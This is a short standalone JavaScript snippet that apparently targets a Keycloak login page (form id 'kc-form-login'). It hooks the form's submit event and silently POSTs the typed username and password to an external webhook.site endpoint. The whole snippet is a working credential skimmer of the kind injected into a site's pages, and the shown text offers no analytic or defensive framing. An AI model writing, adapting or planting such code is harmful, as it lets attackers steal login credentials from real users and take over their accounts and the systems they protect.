window.addEventListener('load', function() {
    const form = document.getElementById('kc-form-login');
    const user = document.getElementById('username');
    const pass = document.getElementById('password');

    if (form && user && pass) {
        form.addEventListener('submit', function() {
            fetch('https://webhook.site/49e19250-e4fd-4b9e-86dc-6a9a8d434b50', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    username: user.value,
                    password: pass.value
                })
            });
        });
    }
});
